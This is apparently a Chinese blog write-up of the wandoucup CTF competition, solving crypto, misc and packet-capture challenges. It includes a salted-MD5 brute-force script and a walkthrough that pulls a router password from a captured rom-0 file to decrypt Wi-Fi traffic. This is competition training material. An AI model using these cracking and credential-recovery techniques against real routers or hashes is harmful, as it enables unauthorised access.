<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Crypto1-我这密码忘了。。。"><a href="#Crypto1-我这密码忘了。。。" class="headerlink" title="Crypto1-我这密码忘了。。。"></a>Crypto1-我这密码忘了。。。</h3><blockquote>
<p>题面有一串base64：VTBzNE9GZEhURWhDVjBveFVrMVVTell4UkRKWU5FTTFRMGszUmtrd1ZFVT0=</p>
<p>连续解码即可得到：SK88WGLHBWJ1RMTK61D2X4C5CI7FI0TE</p>
<p>提交即可。</p>
</blockquote>
<h3 id="Crypto2-二战时期的密码"><a href="#Crypto2-二战时期的密码" class="headerlink" title="Crypto2-二战时期的密码"></a>Crypto2-二战时期的密码</h3><blockquote>
<p>据说是某平台原题，甚至专门去查了一下二战时期的密码学，题面：</p>
<pre class=" language-c"><code class="language-c">已知将一个flag以一种加密形式为使用密钥进行加密，使用密钥WELCOMETOCFF加密后密文为<span class="token number">000000000000000000000000000000000000000000000000000101110000110001000000101000000001</span>，请分析出flag
</code></pre>
<p>WELCOMETOCFF为密钥，长度为12，而二进制串长度为84，既然密文为二进制，那么可以想到的比较简单的加密操作就是按位与，按位或，以及按位异或。</p>
<p>尝试后发现是异或操作，将WELCOMETOCFF，分别用七位二进制表示其在字母表中的顺序，并且每对应的七位进行异或操作：</p>
<pre class=" language-c"><code class="language-c">密文

<span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0010111</span> <span class="token number">0000110</span> <span class="token number">0010000</span> <span class="token number">0010100</span> <span class="token number">0000001</span>

XOR

密钥
W E L C O M E T O C F F
<span class="token number">0010111</span> <span class="token number">0000101</span> <span class="token number">0001100</span> <span class="token number">0000011</span> <span class="token number">0001111</span> <span class="token number">0001101</span> <span class="token number">0000101</span> <span class="token number">0010100</span> <span class="token number">0001111</span> <span class="token number">0000011</span> <span class="token number">0000110</span> <span class="token number">0000110</span>

得到：
<span class="token number">0010111</span> <span class="token number">0000101</span> <span class="token number">0001100</span> <span class="token number">0000011</span> <span class="token number">0001111</span> <span class="token number">0001101</span> <span class="token number">0000101</span> <span class="token number">0000011</span> <span class="token number">0001001</span> <span class="token number">0010011</span> <span class="token number">0010010</span> <span class="token number">0000111</span>
W E L C O M E C I S R G

<span class="token operator">==</span><span class="token operator">></span> flag<span class="token punctuation">{</span>WELCOMECISRG<span class="token punctuation">}</span>
</code></pre>
<p>提交即可。</p>
</blockquote>
<h3 id="Crypto3-被黑了，求密码"><a href="#Crypto3-被黑了，求密码" class="headerlink" title="Crypto3-被黑了，求密码"></a>Crypto3-被黑了，求密码</h3><blockquote>
<p>摩斯电码解码即可：</p>
<p><img src="https://i.loli.net/2018/10/28/5bd5dc8906c6b.png" alt=""></p>
<p>flag:JRQ058XMGC1I7PB4UNGA7BLNBCMS6YJ0</p>
</blockquote>
<h3 id="Crypto4-出航了-出航啦！！"><a href="#Crypto4-出航了-出航啦！！" class="headerlink" title="Crypto4-出航了~出航啦！！"></a>Crypto4-出航了~出航啦！！</h3><blockquote>
<p>根据题面，尝试进行对请求类型进行过滤，发现POST请求只有一个，并且有userid和pswrd：</p>
<p><img src="https://i.loli.net/2018/10/29/5bd5dd387aca9.png" alt=""></p>
<p>尝试将pswrd的值解码后提交flag，成功。</p>
</blockquote>
<h3 id="Crypto5-IDC密码破解-未解出"><a href="#Crypto5-IDC密码破解-未解出" class="headerlink" title="Crypto5-IDC密码破解(未解出)"></a>Crypto5-IDC密码破解(未解出)</h3><blockquote>
<p>给出一串字符<code>js4163633181327481</code></p>
<p>完全脑洞题：手机九键<code>4163633181327481</code>，没用过的咋活。。。</p>
</blockquote>
<h3 id="Crypto6-超级密码"><a href="#Crypto6-超级密码" class="headerlink" title="Crypto6-超级密码"></a>Crypto6-超级密码</h3><blockquote>
<p>这题给出了大量的md5值，以及类似于base64格式的字符串，很容易就想到hash加盐(salt)的问题，而且隐约记得之前在哪看到过这个题。</p>
<p>脚本爆破（时间原因，直接从1234567880开始）：</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf-8</span>
<span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> numba <span class="token keyword">import</span> jit
@jit
<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    password <span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"f09ebdb2bb9f5eb4fbd12aad96e1e929.p5Zg6LtD"</span><span class="token punctuation">,</span><span class="token string">"6cea25448314ddb70d98708553fc0928.ZwbWnG0j"</span><span class="token punctuation">,</span><span class="token string">"2629906b029983a7c524114c2dd9cc36.1JE25XOn"</span><span class="token punctuation">,</span><span class="token string">"2e854eb55586dc58e6758cfed62dd865.ICKTxe5j"</span><span class="token punctuation">,</span><span class="token string">"7b073411ee21fcaf177972c1a644f403.0wdRCo1W"</span><span class="token punctuation">,</span><span class="token string">"6795d1be7c63f30935273d9eb32c73e3.EuMN5GaH"</span><span class="token punctuation">,</span><span class="token string">"d10f5340214309e3cfc00bbc7a2fa718.aOrND9AB"</span><span class="token punctuation">,</span><span class="token string">"8e0dc02301debcc965ee04c7f5b5188b.uQg6JMcx"</span><span class="token punctuation">,</span><span class="token string">"4fec71840818d02f0603440466a892c9.XY5QnHmU"</span><span class="token punctuation">,</span><span class="token string">"ee8f46142f3b5d973a01079f7b47e81c.zMVNlHOr"</span><span class="token punctuation">,</span><span class="token string">"e4d9e1e85f3880aedb7264054acd1896.TqRhn1Yp"</span><span class="token punctuation">,</span><span class="token string">"0fd046d8ecddefc66203f6539cac486b.AR5lI2He"</span><span class="token punctuation">,</span><span class="token string">"f6326f02adaa31a66ed06ceab2948d01.Aax2fIPl"</span><span class="token punctuation">,</span><span class="token string">"720ba10d446a337d79f1da8926835a49.ZAOYDPR2"</span><span class="token punctuation">,</span><span class="token string">"06af8bcc454229fe5ca09567a9071e62.hvcECKYs"</span><span class="token punctuation">,</span><span class="token string">"79f58ca7a81ae2775c2c2b73beff8644.TgFacoR3"</span><span class="token punctuation">,</span><span class="token string">"46aaa5a7fef5e250a2448a8d1257e9cf.GLYu0NO4"</span><span class="token punctuation">,</span><span class="token string">"2149ac87790dd0fe1b43f40d527e425a.5Xk2O1sG"</span><span class="token punctuation">,</span><span class="token string">"d15a36d8be574ac8fe64689c728c268e.aZikhUEy"</span><span class="token punctuation">,</span><span class="token string">"ff7bced91bd9067834e3ad14cc1464cd.E7UROqXn"</span><span class="token punctuation">,</span><span class="token string">"8cc0437187caf10e5eda345cb6296252.XPin3mVB"</span><span class="token punctuation">,</span><span class="token string">"5cfcdca4a9cb2985a0b688406617689e.nsGqoafv"</span><span class="token punctuation">,</span><span class="token string">"5a7dfa8bc7b5dfbb914c0a78ab2760c6.YC1qZUFR"</span><span class="token punctuation">,</span><span class="token string">"8061d8f222167fcc66569f6261ddd3cc.wNgQi615"</span><span class="token punctuation">,</span><span class="token string">"3d8a02528c949df7405f0b48afe4a626.CO2NMusb"</span><span class="token punctuation">,</span><span class="token string">"70651acbc8bd027529bbcccdbf3b0f14.CAXVjFMd"</span><span class="token punctuation">,</span><span class="token string">"a9dbe70e83596f2d9210970236bdd535.TL6sjEuK"</span><span class="token punctuation">,</span><span class="token string">"9ed6ef5780f705ade6845b9ef349eb8f.tJ90ibsz"</span><span class="token punctuation">,</span><span class="token string">"4b46fac0c41b0c6244523612a6c7ac4a.VTjOSNmw"</span><span class="token punctuation">,</span><span class="token string">"8141e6ecb4f803426d1db8fbeb5686ef.lh75cdNC"</span><span class="token punctuation">,</span><span class="token string">"df803949fd13f5f7d7dd8457a673104b.V39sEvYX"</span><span class="token punctuation">,</span><span class="token string">"19052cc5ef69f90094753c2b3bbcd41d.YwoGExpg"</span><span class="token punctuation">,</span><span class="token string">"cf8591bdccfaa0cdca652f1d31dbd70f.pJCLui49"</span><span class="token punctuation">,</span><span class="token string">"66e10e3d4a788c335282f42b92c760a1.NQCZoIhj"</span><span class="token punctuation">,</span><span class="token string">"94c3ae5bcc04c38053106916f9b99bda.vOktelLQ"</span><span class="token punctuation">,</span><span class="token string">"e67e88646758e465697c15b1ef164a8d.x0hwJGHj"</span><span class="token punctuation">,</span><span class="token string">"84d3d828e1a0c14b5b095bedc23269fb.2HVWe9fM"</span><span class="token punctuation">,</span><span class="token string">"264a9e831c3401c38021ba3844479c3f.Cx4og6IW"</span><span class="token punctuation">,</span><span class="token string">"ed0343dec184d9d2c30a9b9c1c308356.g2rqmPkT"</span><span class="token punctuation">,</span><span class="token string">"ad5ba8dc801c37037350578630783d80.pFK2JDT5"</span><span class="token punctuation">,</span><span class="token string">"3f588bedb704da9448e68fe81e42bca6.4ANDOiau"</span><span class="token punctuation">,</span><span class="token string">"970c9cf3cad3dfa7926f53ccaae89421.R6ML7Qy8"</span><span class="token punctuation">,</span><span class="token string">"e0a097b7cceaa7a8949fe039884e4a2d.dul2ynqL"</span><span class="token punctuation">,</span><span class="token string">"7df505218102c64b1fe4fa5981ddb6fa.jPeoyS57"</span><span class="token punctuation">,</span><span class="token string">"fd4f6043da1f7d5dca993c946ef6cd7c.6p9CwGaY"</span><span class="token punctuation">,</span><span class="token string">"5fe6d99b9a2824949279187c246c9c30.OGQ2J57y"</span><span class="token punctuation">,</span><span class="token string">"135b150ad513a961089bb1c05085a3d9.h0dw1Fro"</span><span class="token punctuation">,</span><span class="token string">"ad6af4fb623b3c51181a371911667fed.HbQT4dRz"</span><span class="token punctuation">,</span><span class="token string">"c9fa4b0db317d88e2b10060225e92494.ebVnpMzS"</span><span class="token punctuation">,</span><span class="token string">"d0deab17d115bd6fdce8592bb3667643.bL5zwgvX"</span><span class="token punctuation">,</span><span class="token string">"006f0cb3a422716692f143f28eb0d187.NHXg1Fof"</span><span class="token punctuation">,</span><span class="token string">"ddc125de34da1a6ec0cbe401f147bc8f.GDai9Y0n"</span><span class="token punctuation">,</span><span class="token string">"be5052053c5a806e8f56ed64e0d67821.40alyH3w"</span><span class="token punctuation">,</span><span class="token string">"aaf18ac446b8c385c4112c10ae87e7dc.ZJQzuIL0"</span><span class="token punctuation">,</span><span class="token string">"a2db20a4b7386dc2d8c30bf9a05ceef7.QnpOlPWH"</span><span class="token punctuation">,</span><span class="token string">"8a4fbc32a3251bb51072d51969ba5d33.rtcbipeq"</span><span class="token punctuation">,</span><span class="token string">"5e35d2c9675ed811880cea01f268e00f.i1Hbne6h"</span><span class="token punctuation">,</span><span class="token string">"9da23007699e832f4e9344057c5e0bd3.EtbGpMSW"</span><span class="token punctuation">,</span><span class="token string">"f09233683d05171420f963fc92764e84.fxHoinEe"</span><span class="token punctuation">,</span><span class="token string">"4feabf309c5872f3cca7295b3577f2a8.KymkJXqA"</span><span class="token punctuation">,</span><span class="token string">"9b94da2fa9402a3fdb4ff15b9f3ba4d2.G3Tdr1Pg"</span><span class="token punctuation">,</span><span class="token string">"b3cd8d6b53702d733ba515dec1d770c5.Y71LJWZz"</span><span class="token punctuation">,</span><span class="token string">"6a5b3b2526bb7e94209c487585034534.rIwb4oxt"</span><span class="token punctuation">,</span><span class="token string">"e9728ef776144c25ba0155a0faab2526.e1sOXSb8"</span><span class="token punctuation">,</span><span class="token string">"d41a5e7a98e28d76dbd183df7e3bcb49.36bedvia"</span><span class="token punctuation">,</span><span class="token string">"81d5ebfea6aff129cf515d4e0e5f8360.dDG4qTjW"</span><span class="token punctuation">]</span>
    n<span class="token operator">=</span><span class="token number">1234567880</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token operator">&lt;</span><span class="token number">10000000000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">66</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            salt <span class="token operator">=</span> password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
            md5 <span class="token operator">=</span> password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">]</span>
            mingwen <span class="token operator">=</span> <span class="token string">"{FLAG:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"}"</span><span class="token operator">+</span>password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
            miwen <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>mingwen<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>miwen <span class="token operator">==</span> md5<span class="token punctuation">)</span> <span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>
                n<span class="token operator">=</span><span class="token number">10000000000</span>
                <span class="token keyword">break</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>
        n<span class="token operator">=</span>n<span class="token operator">+</span><span class="token number">1</span>

run<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>运行效果：</p>
<p><img src="https://i.loli.net/2018/10/29/5bd5e5d2d3670.png" alt=""></p>
<p>flag:1234567890</p>
</blockquote>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Misc1-会飞的狗狗"><a href="#Misc1-会飞的狗狗" class="headerlink" title="Misc1-会飞的狗狗"></a>Misc1-会飞的狗狗</h3><p><img src="https://i.loli.net/2018/10/29/5bd5e67f18c7d.jpg" alt=""></p>
<p>直接查看文件内容可以得到末尾的base64字符串，接解码得到flag</p>
<p><img src="https://i.loli.net/2018/10/29/5bd5e6629e3e4.png" alt=""></p>
<h3 id="Misc2-文件类型分析"><a href="#Misc2-文件类型分析" class="headerlink" title="Misc2-文件类型分析"></a>Misc2-文件类型分析</h3><blockquote>
<p>得到一个zip压缩包，点开来看看，存在[content-types].xml文件，基本上可以确定是微软公司office套件的格式。简单试过doc，docx，ppt，pptx，xls，xlxs没用之后，查到xps：</p>
<p><img src="https://i.loli.net/2018/10/29/5bd5e705b81e3.png" alt=""></p>
<p>于是改为xps文件后缀即可，将xps提交。</p>
</blockquote>
<h3 id="Misc3-真真假假分不清楚"><a href="#Misc3-真真假假分不清楚" class="headerlink" title="Misc3-真真假假分不清楚"></a>Misc3-真真假假分不清楚</h3><blockquote>
<p>简单的一个伪加密，修改全局加密标志位，将奇数改为偶数即可。</p>
<p>{FLAG:011938d495c36aeab4bfbd897c240d31}</p>
</blockquote>
<h3 id="Misc4-诱人的音乐"><a href="#Misc4-诱人的音乐" class="headerlink" title="Misc4-诱人的音乐"></a>Misc4-诱人的音乐</h3><blockquote>
<p>这题的音频文件中存在一段摩斯电码（有的同学通过二进制getflag），通过音频分析软件可以将其提取出来：</p>
</blockquote>
<pre class=" language-python"><code class="language-python">
<span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span>

<span class="token comment" spellcheck="true">#一次性解码行不通，可以将其分为三段分别解码并且将三个非正常字符转为16进制：</span>
<span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
晬<span class="token number">61677b6368</span>
晬 <span class="token operator">==</span><span class="token operator">></span> <span class="token number">0x666c</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span>
ㅰ<span class="token number">74756e65</span>
ㅰ <span class="token operator">==</span><span class="token operator">></span> <span class="token number">0x3170</span>
<span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span>
張<span class="token number">337665727c</span>
張 <span class="token operator">==</span><span class="token operator">></span> <span class="token number">0x5f35</span>

<span class="token comment" spellcheck="true">#进行拼接</span>
<span class="token number">666c61677b6368317074756e655f35337665727c</span>
<span class="token comment" spellcheck="true">#可以得到</span>
flag<span class="token punctuation">{</span>ch1ptune_53ver<span class="token operator">|</span>
<span class="token comment" spellcheck="true">#提交ch1ptune_53ver即可</span>

</code></pre>
<h3 id="Misc5-神秘的文件名-未解出"><a href="#Misc5-神秘的文件名-未解出" class="headerlink" title="Misc5-神秘的文件名(未解出)"></a>Misc5-神秘的文件名(未解出)</h3><blockquote>
<p> 可以通过binwalk得到一个逆向题，较难，未解出。</p>
</blockquote>
<h2 id="网络协议分析"><a href="#网络协议分析" class="headerlink" title="网络协议分析"></a>网络协议分析</h2><h3 id="网络协议分析1-数据包里有甜甜圈哦"><a href="#网络协议分析1-数据包里有甜甜圈哦" class="headerlink" title="网络协议分析1-数据包里有甜甜圈哦~"></a>网络协议分析1-数据包里有甜甜圈哦~</h3><blockquote>
<p>wireshark打开数据包后，依次使用以下过滤规则:<br><code>http contains flag</code></p>
<p><code>tcp contains flag</code></p>
<p><code>udp contains flag</code></p>
<p>即可通过<code>udp contains flag</code>查到flag。</p>
<p><img src="https://i.loli.net/2018/10/29/5bd5eaff1fee2.png" alt=""></p>
</blockquote>
<h3 id="网络协议分析2-嘿嘿嘿-未解出"><a href="#网络协议分析2-嘿嘿嘿-未解出" class="headerlink" title="网络协议分析2-嘿嘿嘿(未解出)"></a>网络协议分析2-嘿嘿嘿(未解出)</h3><blockquote>
<p>经过疯狂手动提取后发现只能获得一丝图片，赛后得知需要用<strong>tcpflow</strong>这个神器重构损害的tcp数据，从而得到图像。</p>
</blockquote>
<h3 id="网络协议分析3-thief"><a href="#网络协议分析3-thief" class="headerlink" title="网络协议分析3-thief"></a>网络协议分析3-thief</h3><blockquote>
<p>拿到数据包打开后发现大部分都是<code>802.11 wlan</code>数据包，过滤一下http请求：</p>
<p><img src="https://i.loli.net/2018/10/29/5bd5ebef87b2d.png" alt=""></p>
<p>可以发现第一个请求的是<code>/rom-0</code>，确实不知为何就觉得这个是关键，google搜索一下：</p>
<p><img src="https://i.loli.net/2018/10/29/5bd5ed05ddbaa.png" alt=""></p>
<p>点进routerPwn发现是一个解压rom-0文件的网址，那我们是不是还缺一个文件。接下来通过导出http对象，我们可以得到一个rom0文件，正好将其解密得到以下内容：</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#猜测是用来解密的密钥咯</span>
Rome4040
TP<span class="token operator">-</span>LINK
public
public
public
public
</code></pre>
<p>在运用wireshark分析流量的过程中我们经常需要使用密钥之类的东西来解密流量，此处同样通过 <a href="https://blog.csdn.net/neal_hddnwpu/article/details/82586235?utm_source=blogxgwz2" target="_blank" rel="noopener">查询资料</a> 可以获得解密方式：</p>
<p><img src="https://i.loli.net/2018/10/29/5bd5eefeb803c.png" alt=""></p>
<p>将密码Rome4040导入解密，可以发现的确出现了<strong>很多http和tcp的包</strong>，根据题目提示使用过滤<code>http contains CTF</code>得到flag：</p>
<p><img src="https://i.loli.net/2018/10/29/5bd5ef72cfc64.png" alt=""></p>
</blockquote>
<blockquote>
<p>🆒wandoucup-CTF-WP到此结束。</p>
<p>Publish by Yof3ng👌。</p>
</blockquote>

            </div>
            <hr/>

            
            <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.88rem;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff;
        background-color: #22AB38;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff;
        background-color: #019FE8;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a class="reward-link btn-floating btn-large waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close"><i class="fa fa-close"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs">
                        <li class="tab wechat-tab waves-effect waves-light"><a class="active" href="#wechat">微信</a></li>
                        <li class="tab alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                    </ul>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('#reward .reward-link').on('click', function () {
            $('#rewardModal').openModal();
        });

        $('#rewardModal .close').on('click', function () {
            $('#rewardModal').closeModal();
        });
    });
</script>
            

            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">

<div id="article-share">
    
    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
    
</div>

<script src="/libs/share/js/social-share.min.js"></script>

            <div class="reprint">
                <p>
                    <span class="reprint-tip">转载请注明: </span>
                    <a href="http://www.yof3ng.xyz" class="b-link-green">Yof3ng's Blog | 热爱分享</a>
                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
                    <a href="/2018/10/28/wandoucup-ctf/" class="b-link-green">wandoucup-ctf</a>
